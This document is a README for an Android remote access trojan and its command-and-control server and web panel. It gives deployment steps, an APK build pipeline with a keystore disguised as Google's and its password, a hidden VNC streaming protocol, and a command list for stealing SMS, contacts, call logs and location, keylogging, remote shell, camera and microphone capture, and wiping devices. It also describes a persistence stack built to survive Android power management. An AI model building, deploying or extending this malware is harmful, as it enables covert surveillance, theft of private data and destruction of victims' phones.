# Android RAT — Full-Stack C2 Platform

## Architecture

```
rat-project/
├── .github/workflows/build-apk.yml   GitHub Actions APK builder
├── android/                           Android Studio project (Java)
│   └── app/src/main/java/com/seguranca/protecao/
│       ├── CommandControlService.java  C2 WebSocket + HVNC streaming
│       ├── UiAssistBridge.java         AccessibilityService (gestures + keylog)
│       ├── PersistenceEngine.java      NEW: Android 14/15/16/17 survival stack
│       ├── JobReconnectService.java    NEW: JobScheduler reconnect
│       ├── AlarmReconnectReceiver.java NEW: Alarm chain reconnect
│       ├── stealth/                    Anti-analysis, battery, network stealth
│       └── ...
├── backend/
│   ├── server.js                      Raw WS /ws (devices) + /panel (browser)
│   ├── db/database.js                 PostgreSQL (Neon recommended)
│   ├── routes/auth.js                 JWT login
│   └── middleware/auth.js             JWT validation
└── frontend/                          React + Vite panel
    └── src/components/
        ├── HvncView.jsx               HVNC canvas + full control bar
        └── tabs/                      SMS, Contacts, Camera, Shell, etc.
```

## Deploy on Render

### 1. PostgreSQL (Neon — free, persistent)
1. Create account at https://neon.tech
2. Create project → copy connection string

### 2. Render Web Service
- **Build command:** `npm run build`
- **Start command:** `npm start`
- **Environment variables:**
  ```
  DATABASE_URL       = postgresql://...  (Neon URL)
  JWT_SECRET         = <64-char random hex>
  ADMIN_USERNAME     = admin
  ADMIN_PASSWORD_HASH= <bcrypt hash of your password>
  DEVICE_SECRET      = <32-char random string>
  ```

### Generate password hash
```bash
node -e "const b=require('bcryptjs'); console.log(b.hashSync('YourPassword', 12))"
```

### 3. Build APK via GitHub Actions
1. Push this repo to GitHub
2. Add secrets: `KEYSTORE_BASE64`, `KEYSTORE_PASSWORD`, `KEY_ALIAS`, `KEY_PASSWORD`
   - Use bundled `android/google-services-release.jks` (password: `GooglePlayServices2024`, alias: `google-services-key`) OR generate a new keystore:
     ```bash
     keytool -genkey -v -keystore release.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
     base64 release.keystore | pbcopy  # → KEYSTORE_BASE64 secret
     ```
3. Go to Actions → Build RAT APK → Run workflow
4. Input: C2 WebSocket URL → `wss://your-app.onrender.com/ws`
5. Download APK from Releases

## HVNC Protocol

Binary WebSocket frames from Android device → `/ws`:
```
[0x01][uint32 BE size][JPEG bytes]  = screen frame (~60fps)
[0x02][uint32 BE size][JPEG bytes]  = camera frame
[0x03][uint32 BE size][bytes]       = audio chunk
```

Backend bridges these to panel at `/panel`:
```
[frameType:1][devIdLen:2][devId:N][payload]
```

## Panel Commands (sent as JSON to device)

| Action                | Params                        |
|----------------------|-------------------------------|
| CLICK                | x, y                          |
| SWIPE                | x1, y1, x2, y2, duration      |
| LONG_PRESS           | x, y                          |
| TYPE                 | text                          |
| INJECT_CLIPBOARD     | text                          |
| BACK / HOME / RECENTS| —                             |
| VOLUME_UP / DOWN     | —                             |
| BLACK_SCREEN_ON/OFF  | —                             |
| LOCK_DEVICE          | —                             |
| TOGGLE_KILLER_MODE   | —                             |
| OPEN_APP             | package                       |
| GET_SMS              | limit                         |
| GET_CONTACTS         | —                             |
| GET_CALL_LOGS        | limit                         |
| GET_LOCATION         | —                             |
| TAKE_PHOTO           | camera (back/front)           |
| TOGGLE_MICROPHONE    | —                             |
| TOGGLE_CAMERA        | —                             |
| TOGGLE_KEYLOGGER     | —                             |
| TOGGLE_SILENT_VNC    | enable                        |
| SHELL                | cmd                           |
| FORMAT_DEVICE        | —  ⚠ destructive              |
| SELF_DESTRUCT        | —  ⚠ destructive              |

## Persistence Stack (Android 16/17)

`PersistenceEngine.java` arms 6 layers simultaneously:

1. **setAlarmClock()** — highest priority OS alarm, shown in lockscreen, survives Doze
2. **JobScheduler** — expedited + persisted, 0ms latency + 500ms deadline
3. **WorkManager** — PeriodicWorkRequest every 15 min
4. **NetworkCallback** — reconnects on every WiFi/cellular change
5. **MediaSession** — active session prevents aggressive kill
6. **Battery whitelist** — request exemption from Doze restrictions

Chain is self-rescheduling: each alarm reschedules the next one before exiting.
